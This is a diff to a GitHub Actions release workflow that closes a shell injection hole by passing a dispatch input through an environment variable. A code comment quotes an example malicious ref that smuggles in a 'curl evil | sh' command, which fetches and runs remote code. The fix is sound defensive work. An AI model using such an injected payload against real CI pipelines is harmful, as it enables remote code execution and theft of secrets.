@@ -210,6 +210,10 @@ jobs:
       - name: Create or update GitHub release
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # Pass the dispatch input through env (injection-safe assignment) instead
+          # of expanding ${{ }} directly into the shell, where a crafted ref like
+          # 'v1"; curl evil | sh; echo "' would execute.
+          INPUT_REF: ${{ github.event.inputs.ref }}
         run: |
           set -euo pipefail
           mapfile -d '' files < <(
@@ -230,7 +234,7 @@ jobs:
             exit 1
           fi
 
-          tag="${{ github.event.inputs.ref }}"
+          tag="$INPUT_REF"
           tag="${tag#refs/tags/}"
 
           if gh release view "$tag" >/dev/null 2>&1; then
